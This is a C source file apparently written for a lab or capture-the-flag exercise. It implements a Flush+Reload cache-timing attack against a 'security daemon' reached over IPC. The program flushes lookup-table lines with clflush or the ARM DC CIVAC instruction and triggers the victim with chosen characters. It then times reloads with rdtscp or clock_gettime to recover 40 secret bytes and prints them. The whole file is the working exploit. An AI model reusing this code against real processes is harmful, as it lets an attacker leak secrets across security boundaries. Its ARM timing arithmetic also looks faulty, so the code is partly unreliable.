#include <stdio.h>
#include <malloc.h>

#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#elif ARM
struct timespec time_data;
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#include "pd.h"
#include "ipc.h"
#include <time.h>
#include <unistd.h>

#ifdef ARM
#define CACHE_HIT_THRESHOLD 100
#else
#define CACHE_HIT_THRESHOLD 100
#endif 

int answer[40][255];


void cacheAttack(int loc, char word)
{
	int c=0;
	volatile int *addr;
	int junk = 0;
	register uint64_t time1, time2;

	// call victim function 
	client_msg->msg_len = 1; // array index 
	client_msg->what    = 1;
	client_msg->msg[0]  = word;
	client_msg->msg[1]  = 0;

	for (int i =0; i<255; i++) 
	{
#ifdef ARM
		asm volatile ("DC CIVAC, %0" :: "r"(get_eTable_ptr(i)));
		asm volatile ("DSB ISH");
		asm volatile ("ISB");
#else
		_mm_clflush( get_eTable_ptr(i) );
#endif

	}   
	usleep(500000);
	client_msg->status  = 1;
	usleep(5000);

	for (int i = 50; i <100; i++)
	{
		addr = (int* ) get_eTable_ptr(i);
#ifdef ARM
		clock_gettime(CLOCK_MONOTONIC, &time_data);
		time1 = (time_data.tv_sec + time_data.tv_nsec);
#else
		time1 = __rdtscp( &junk);
#endif
		junk = * addr;

#ifdef ARM
		clock_gettime(CLOCK_MONOTONIC, &time_data);
		time2 = (time_data.tv_sec + time_data.tv_nsec) - time1;
		usleep(1000);
#else
		time2 = __rdtscp( &junk) - time1;
#endif

		if (time2 < CACHE_HIT_THRESHOLD && i > 60 )
		{
			answer[loc][i]++;
		}
	}
}
int big(int arr[])
{
	int ret = 0;
	int max = 0;
	for(int i =0; i < 255;i++)
	{
		if( max < arr[i] )
		{
			ret = i;
			max = arr[i];
		} 
	}
	return ret;
}
int main(int argc, char *argv[])
{
	security_daemon_connect();
	memset(answer,0,sizeof(answer));
	for(int i=0; i<40;i++)
	{
		int max = 0;
		for(int t = 0; t<3;t++)  cacheAttack(i, (i + 'A'));
		int ret = big(answer[i]);
		printf("loc:%d, asnwer[%d]-> chr(%c), count:%d\n", i,ret, ret , answer[i][ret]);
	}
}
